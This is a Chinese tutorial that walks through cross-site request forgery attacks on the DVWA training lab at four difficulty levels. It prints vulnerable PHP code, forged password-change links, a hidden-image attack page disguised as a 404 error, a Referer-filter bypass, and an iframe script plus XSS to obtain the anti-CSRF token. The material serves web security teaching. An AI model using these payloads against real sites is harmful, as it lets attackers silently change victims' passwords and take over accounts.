****CSRF(Cross-site request forgery)**** 
-----------------------------------------

CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。在2013年发布的新版OWASP Top 10中，CSRF排名第8。

[![1.png](http://image.3001.net/images/20161031/14778952387559.png!small)](http://image.3001.net/images/20161031/14778952387559.png)

下面对四种级别的代码进行分析。

****Low****
-----------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Change' ] ) ) {       
    // Get input       
    $pass_new  = $_GET[ 'password_new' ];       
    $pass_conf = $_GET[ 'password_conf' ];        
    // Do the passwords match?       
    if( $pass_new == $pass_conf ) {       1
        // They do!       1
        $pass_new = mysql_real_escape_string( $pass_new );       1
        $pass_new = md5( $pass_new );        1
        // Update the database       1
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";       1
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        1
        // Feedback for the user       1
        echo "<pre>Password Changed.</pre>";       2
    }       2
    else {       2
        // Issue with passwords matching       2
        echo "<pre>Passwords did not match.</pre>";       2
    }        2
    mysql_close();       2
}        2
?>
```


 可以看到，服务器收到修改密码的请求后，会检查参数password\_new与password\_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现= =）。

****漏洞利用****
------------

1、构造链接

A) 最基础的:

[http://192.168.153.130/dvwa/vulnerabilities/csrf/?password\_new=password&password\_conf=password&Change=Change#](http://www.freebuf.com/articles/web/118352.html)

当受害者点击了这个链接，他的密码就会被改成password（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了）

 [![1.png](http://image.3001.net/images/20161031/14778953244372.png!small)](http://image.3001.net/images/20161031/14778953244372.png)

需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。

[![1.png](http://image.3001.net/images/20161031/14778953704168.png!small)](http://image.3001.net/images/20161031/14778953704168.png)

有人会说，这个链接也太明显了吧，不会有人点的，没错，所以真正攻击场景下，我们需要对链接做一些处理。

B) 我们可以使用短链接来隐藏URL（点击短链接，会自动跳转到真实网站）：

如[http://dwz.cn/](http://dwz.cn/)\*\*\*\*

[![1.png](http://image.3001.net/images/20161031/14778954786668.png!small)](http://image.3001.net/images/20161031/14778954786668.png)

因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。

 [![1.png](http://image.3001.net/images/20161031/14778955097586.png!small)](http://image.3001.net/images/20161031/14778955097586.png)

需要提醒的是，虽然利用了短链接隐藏url，但受害者最终还是会看到密码修改成功的页面，所以这种攻击方法也并不高明。

C) 构造攻击页面

现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。

```
<img src="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&password_conf=hack&Change=Change#" border="0" style="display:none;"/>       
<h1>404<h1>       
<h2>file not found.<h2>
```


当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack。

 [![1.png](http://image.3001.net/images/20161031/14778955408376.png!small)](http://image.3001.net/images/20161031/14778955408376.png)

****Medium****
--------------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Change' ] ) ) {       
    // Checks to see where the request came from       
    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) {       
        // Get input       
        $pass_new  = $_GET[ 'password_new' ];       
        $pass_conf = $_GET[ 'password_conf' ];        1
        // Do the passwords match?       1
        if( $pass_new == $pass_conf ) {       1
            // They do!       1
            $pass_new = mysql_real_escape_string( $pass_new );       1
            $pass_new = md5( $pass_new );        1
            // Update the database       1
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";       1
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        2
            // Feedback for the user       2
            echo "<pre>Password Changed.</pre>";       2
        }       2
        else {       2
            // Issue with passwords matching       2
            echo "<pre>Passwords did not match.</pre>";       2
        }       2
    }       2
    else {       2
        // Didn't come from a trusted source       3
        echo "<pre>That request didn't look correct.</pre>";       3
    }        3
    mysql_close();       3
}        3
?>
```


相关函数说明

int eregi(string pattern, string string)

检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。

可以看到，Medium级别的代码检查了保留变量 HTTP\_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER\_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。

[![1.png](http://image.3001.net/images/20161031/14778955793490.png!small)](http://image.3001.net/images/20161031/14778955793490.png)

****漏洞利用****
------------

过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）

我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了

 [![1.png](http://image.3001.net/images/20161031/14778956078386.png!small)](http://image.3001.net/images/20161031/14778956078386.png)

下面是Burpsuite的截图

 [![1.png](http://image.3001.net/images/20161031/1477895636890.png!small)](http://image.3001.net/images/20161031/1477895636890.png)

Referer参数完美绕过过滤规则

[![1.png](http://image.3001.net/images/20161031/14778956835405.png!small)](http://image.3001.net/images/20161031/14778956835405.png)

密码修改成功

[![1.png](http://image.3001.net/images/20161031/14778957125554.png!small)](http://image.3001.net/images/20161031/14778957125554.png)

****High****
------------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Change' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );        
    // Get input       
    $pass_new  = $_GET[ 'password_new' ];       
    $pass_conf = $_GET[ 'password_conf' ];        1
    // Do the passwords match?       1
    if( $pass_new == $pass_conf ) {       1
        // They do!       1
        $pass_new = mysql_real_escape_string( $pass_new );       1
        $pass_new = md5( $pass_new );        1
        // Update the database       1
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";       1
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );        2
        // Feedback for the user       2
        echo "<pre>Password Changed.</pre>";       2
    }       2
    else {       2
        // Issue with passwords matching       2
        echo "<pre>Passwords did not match.</pre>";       2
    }        2
    mysql_close();       3
}        3
// Generate Anti-CSRF token       3
generateSessionToken();        3
?>
```


可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。

****漏洞利用****
------------

要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。

试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。

```
<script type="text/javascript">       
    function attack()       
  {       
   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;       
  document.getElementById("transfer").submit();        1
  }       1
</script>       1
<iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">       1
</iframe>       2
<body onload="attack()">       2
  <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">       2
   <input type="hidden" name="password_new" value="password">       2
    <input type="hidden" name="password_conf" value="password">       3
   <input type="hidden" name="user_token" value="">       3
  <input type="hidden" name="Change" value="Change">       3
   </form>       3
</body>
```


攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。

然而理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是[http://192.168.153.130/dvwa/vulnerabilities/csrf](http://192.168.153.130/dvwa/vulnerabilities/csrf)，位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user\_token。

由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。下面利用High级别的XSS漏洞协助获取Anti-CSRF token（因为这里的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）。

 [![1.png](http://image.3001.net/images/20161031/14778957473585.png!small)](http://image.3001.net/images/20161031/14778957473585.png)

这里的Name存在XSS漏洞，于是抓包，改参数，成功弹出token

 [![1.png](http://image.3001.net/images/20161031/1477895775866.png!small)](http://image.3001.net/images/20161031/1477895775866.png)

注入代码如下

 [![1.png](http://image.3001.net/images/20161031/14778958053271.png!small)](http://image.3001.net/images/20161031/14778958053271.png)

****Impossible****
------------------

服务器端核心代码

```
<?php        
if( isset( $_GET[ 'Change' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );        
    // Get input       
    $pass_curr = $_GET[ 'password_current' ];       
    $pass_new  = $_GET[ 'password_new' ];       1
    $pass_conf = $_GET[ 'password_conf' ];        1
    // Sanitise current password input       1
    $pass_curr = stripslashes( $pass_curr );       1
    $pass_curr = mysql_real_escape_string( $pass_curr );       1
    $pass_curr = md5( $pass_curr );        1
    // Check that the current password is correct       1
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );       1
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );       2
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR );       2
    $data->execute();        2
    // Do both new passwords match and does the current password match the user?       2
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) {       2
        // It does!       2
        $pass_new = stripslashes( $pass_new );       2
        $pass_new = mysql_real_escape_string( $pass_new );       2
        $pass_new = md5( $pass_new );        3
        // Update database with new password       3
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );       3
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR );       3
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );       3
        $data->execute();        3
        // Feedback for the user       3
        echo "<pre>Password Changed.</pre>";       3
    }       3
    else {       4
        // Issue with passwords matching       4
        echo "<pre>Passwords did not match or current password incorrect.</pre>";       4
    }       4
}        4
// Generate Anti-CSRF token       4
generateSessionToken();        4
?>
```


可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。

**\*本文原创作者：lonehand**

**转自：[http://www.freebuf.com/articles/web/118352.html](http://www.freebuf.com/articles/web/118352.html)**